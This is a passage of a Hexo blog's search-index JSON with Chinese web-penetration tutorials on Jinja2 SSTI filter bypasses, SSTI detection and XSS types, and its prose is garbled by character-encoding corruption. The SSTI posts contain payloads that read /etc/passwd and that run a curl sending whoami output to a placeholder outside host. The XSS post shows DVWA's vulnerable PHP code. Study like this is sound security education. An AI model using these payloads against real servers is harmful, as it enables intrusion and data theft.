ç»•è¿‡ï¼ˆASCIIç ã€Unicodeç¼–ç ç­‰ï¼‰\n4ã€åˆ©ç”¨chrå‡½æ•°\nå› ä¸ºæˆ‘ä»¬æ²¡æ³•ç›´æ¥ä½¿ç”¨chrå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡`__builtins__`æ‰¾åˆ°ä»–\n```\n{% set chr=url_for.__globals__['__builtins__'].chr %}\n{{\"\"[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}  //%2bä¸º + ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²\n==>{{\"\".__class__}}\n```\n\n5ã€åœ¨jinja2é‡Œé¢å¯ä»¥åˆ©ç”¨`~`è¿›è¡Œæ‹¼æ¥\n```\n{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\n```\n\n6ã€å¤§å°å†™è¿‡æ»¤è½¬æ¢\n### â…¡. è¿‡æ»¤å™¨\n>åœ¨æ¨¡æ¿ä¸­, è¿‡æ»¤å™¨ç›¸å½“äºä¸€ä¸ªå‡½æ•°, æŠŠå½“å‰çš„å˜é‡ä¼ å…¥åˆ°è¿‡æ»¤å™¨ä¸­, ç„¶åè¿‡æ»¤å™¨æ ¹æ®è‡ªèº«åŠŸèƒ½, å†è¿”å›å¯¹åº”çš„å€¼, ä¹‹åå†æŠŠç»“æœæ¸²æŸ“åˆ°é¡µé¢ä¸­\nåŸºæœ¬è¯­æ³•: `{{ å˜é‡ | è¿‡æ»¤å™¨åç§° }} `ä½¿ç”¨ç®¡é“ç¬¦å·`|`è¿›è¡Œç»„åˆï¼Œå¯ä»¥é“¾æ¥å¤šä¸ªè¿‡æ»¤å™¨ã€‚ä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚\n\nå¸¸ç”¨çš„è¿‡æ»¤å™¨ï¼š\n```\n1. attr\n#ç”¨äºè·å–å˜é‡ï¼Œå¯ç”¨äº. [] éƒ½è¢«è¿‡æ»¤çš„æƒ…å†µ\n\"\"|attr(\"__class__\") <==> \"\".__class__\n2. format\n#æ ¼å¼åŒ–å­—ç¬¦ä¸²\n\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)  \n<==>  \n\"__class__\"\n3. join\n#å°†ä¸€ä¸ªåºåˆ—æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œjoin ('|')å°†ä»¤æ¯ä¸€ä¸ªå…ƒç´ è¢«'|'éš”å¼€\n\"\"[['__clas','s__']|join] æˆ–è€… \"\"[('__clas','s__')|join]\n<==>\n\"\"[\"__class__\"]\n4. lower\n#è½¬æ¢æˆå°å†™\n5. replace\n#æ›¿æ¢å­—ç¬¦ä¸²\n\"__claee__\"|replace(\"ee\",\"ss\") æ„é€ å‡ºå­—ç¬¦ä¸² \"__class__\"\n\"__ssalc__\"|reverse æ„é€ å‡º \"__class__\"\n6. string\n#å°†å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡æµè§ˆå™¨æ˜¾ç¤ºçš„ç¬¦å·æ„é€ å‡ºæˆ‘ä»¬å¯åˆ©ç”¨çš„å­—ç¬¦ä¸²ã€ç¬¦å·ç­‰\n().__class__   å‡ºæ¥çš„æ˜¯<class 'tuple'>\n().__class__|string)[0] å‡ºæ¥çš„æ˜¯<\n7. list\n#è½¬æ¢æˆåˆ—è¡¨ï¼Œå¯ä»¥ä¸ä¸Šé¢çš„stringé…åˆï¼Œå°±å¯ä»¥è°ƒç”¨åˆ—è¡¨é‡Œé¢çš„æ–¹æ³•å–å­—ç¬¦äº†\n(()|select|string|list).pop(0)\n```\nã€èµ„æ–™æŸ¥é˜…ï¼š[SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰](https://blog.csdn.net/miuzzx/article/details/110220425)ã€‘\n### â…¢. å…³é”®å­—ç»•è¿‡\n1. `.`å’Œ`[]`\n>å¯ç”¨è¿‡æ»¤å™¨`attr`ç»•è¿‡ï¼Œè‹¥`.`å¯ç”¨ï¼Œè¿˜å¯ä»¥`__getitem__`ç»•è¿‡`[]`ã€‚\n\n2. `\"\"`å’Œ`_`ç»•è¿‡\n>`request.args`ã€`request.values`ã€`request.cookies` æ˜¯ flask ä¸­çš„å±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠpathå½“ä½œå˜é‡åï¼Œå°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤\n\n```\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd\n=>\n{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__\n```\n\n3. `{{}}`ç»•è¿‡\n>ç”¨`{%%}`çš„å·¦åŠè¾¹ç»•è¿‡\n\n```{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami` ').read()=='p' %}1{% endif %}```\n\n# å››ã€SSTIæ£€æµ‹\n## 1ã€Tplmap\n## 2ã€é™„è¡¨\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916005446865-111172183.png)\nä½¿ç”¨æ ‡å¿—æµ‹è¯•ã€‚å¦‚jinja2ï¼š`{{7+8}}`ï¼Œå¦‚æœè¾“å‡º`15`ï¼Œåˆ™æœ‰å¯èƒ½å­˜åœ¨SSTIæ¼æ´ã€‚\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916011329647-1428250087.png)\n<å›¾æº: https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html>","tags":["web","æ¸—é€","å¸¸è§æ¼æ´"],"categories":["æ¸—é€ï¼šä»0åˆ°1"]},{"title":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","url":"/2022/12/06/XSSè·¨ç«™è„šæœ¬æ”»å‡»/","content":"# ä¸€ã€XSS ç®€ä»‹\nXSSï¼ˆCross Site Scripting è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ï¼ŒæŒ‡æ¶æ„æ”»å‡»è€…é€šè¿‡å‘ç½‘ç«™æ’å…¥æ¶æ„payloadæˆ–æ¶æ„è„šæœ¬ï¼Œä»è€Œç›—å–cookieã€sessionä¿¡æ¯ä»¥åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›è¡Œè¿è§„æ“ä½œã€ç›—å–ç”¨æˆ·èµ„æ–™ç­‰ç­‰ã€‚\n## å¸¸è§XSSæ¼æ´åˆ†ç±»\nåå°„å‹XSS\nå­˜å‚¨å‹XSS\nDOM XSS\n# äºŒã€XSSæ¼æ´æˆå› \n### 1ã€åå°„å‹XSS\nç½‘ç«™å¯¹äºç”¨æˆ·æäº¤çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–è½¬ä¹‰æ“ä½œï¼ˆæˆ–è€…è¿‡æ»¤ã€è½¬ä¹‰ä¸è¶³ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…åµŒå…¥çš„æ¶æ„ä»£ç è¢«æäº¤ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è§£æåï¼Œåœ¨ç›¸åº”å†…å®¹ä¸­è¿”å›è¾“å…¥çš„XSSä»£ç ï¼Œæœ€ç»ˆç”±æµè§ˆå™¨è§£é‡Šæ‰§è¡Œã€‚\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720101405662-787659899.png)\nåŸå‹å¦‚ä¸‹ï¼š\n`<?php\necho 'your input:' . $_GET['input'];\n?>`\n#### åŸç†è§£æ\nè‹¥inputä¸º`<script>alert(/XSS/)</script>`\nä¸”inputå€¼æœªç»ä»»ä½•è¿‡æ»¤ä¾¿ç›´æ¥è¾“å‡ºï¼Œåˆ™æœåŠ¡ç«¯è§£æåï¼Œechoè¯­å¥ä¼šå°†å®¢æˆ·ç«¯è¾“å…¥çš„ä»£ç **å®Œæ•´åœ°è¾“å‡ºåˆ°HTTPå“åº”ä¸­ï¼Œæµè§ˆå™¨è§£æå¹¶æ‰§è¡Œ**ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220719220708564-422036808.png)\nå‘ç”Ÿå¼¹çª—ï¼Œè¯´æ˜payloadè¢«æ‰§è¡Œã€‚\nåŒç†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¦‚ä¸‹å›¾æ‰€ç¤ºæ„é€ urlï¼Œå½“ç”¨æˆ·ç‚¹å‡»è¯¥urlé“¾æ¥ï¼Œæ”»å‡»å°±å‘ç”Ÿäº†\n`http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>alert(/XSS/)</script>`\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720100024888-1599748353.png)\nè‹¥å°†payloadæ›¿æ¢æˆæ¶æ„è„šæœ¬ï¼Œåˆ™åœ¨**ç”¨æˆ·ç‚¹å‡»**æ—¶ï¼Œå‘ç”Ÿå¦‚ä¸Šè¿‡ç¨‹ï¼Œæµè§ˆå™¨è§£æå¹¶æ‰§è¡Œï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚\n\n### 2ã€å­˜å‚¨å‹XSS\nåå°„å‹XSSæ¯æ¬¡çš†éœ€è¦ç”¨æˆ·æäº¤ä»£ç ï¼ˆä¹Ÿå³â€œç‚¹å‡»â€ï¼‰æ‰èƒ½è¿›è¡Œæ”»å‡»ã€‚è€Œå­˜å‚¨å‹XSSæäº¤çš„XSSä»£ç ä¼š**å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯**ï¼Œä¸‹æ¬¡è¯·æ±‚è¯¥ç½‘é¡µæ—¶æ— éœ€å†æ¬¡æäº¤XSSä»£ç ã€‚å¸¸è§çš„åº”ç”¨åœºæ™¯æœ‰ç•™è¨€æ¿ã€åœ¨çº¿èŠå¤©å®¤ã€é‚®ä»¶æœåŠ¡ç­‰ï¼Œå½“æ”»å‡»è€…æäº¤åŒ…å«XSSä»£ç çš„ç•™è¨€åï¼ŒæœåŠ¡ç«¯ä¼šå°†å…¶**å­˜å‚¨åœ¨æ•°æ®åº“ä¸­**ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®ç½‘é¡µæŸ¥çœ‹ç•™è¨€æ—¶ï¼ŒæœåŠ¡ç«¯å°†ä»æ•°æ®åº“ä¸­æŸ¥è¯¢å·²æœ‰ç•™è¨€ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºåœ¨HTTPå“åº”ä¸­ï¼Œç”±æµè§ˆå™¨å¯¹åŒ…å«æ¶æ„ä»£ç çš„å“åº”è§£æå¹¶æ‰§è¡Œã€‚\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720101613900-167556487.png)\nåŸå‹å¦‚ä¸‹ï¼š\n```\n<?php\nif( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Sanitize name input\n    $name = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n    //mysql_close();\n}\n?> \n```\n#### åŸç†è§£æ\næ”»å‡»è€…æäº¤ç•™è¨€`<script>alert(/XSS/)</script>`åï¼ŒXSSä»£ç è¢«ä¿å­˜åœ¨ æ•°æ®åº“ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720102803485-2027202148.png)\nå¹¶ä¸”ç«‹å³æ‰§è¡Œäº†ä¸€æ¬¡æŸ¥è¯¢ï¼ŒXSSä»£ç ç›´æ¥è¢«è§¦å‘ã€‚\nå½“å…¶ä»–ç”¨æˆ·è®¿é—®ç½‘é¡µæ—¶ï¼ŒæœåŠ¡ç«¯éƒ½å°†ä»**æ•°æ®åº“**ä¸­æŸ¥è¯¢åˆ°è¯¥XSSä»£ç ï¼Œè§¦å‘æ‰§è¡Œï¼Œä»è€Œè¢«ç›—å–cookieï¼ˆsessionidï¼‰ç­‰ä¿¡æ¯ã€‚\n\n### 3ã€DOM XSS","tags":["web","æ¸—é€","å¸¸è§æ¼æ´"],"categories":["æ¸—é€ï¼šä»0åˆ°1"]},{"title":"Hello, Stuuupid","url":"/2022/12/05/Hello-Stuuupid/"},{"title":"Hello World","url":"/2022/12/04/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]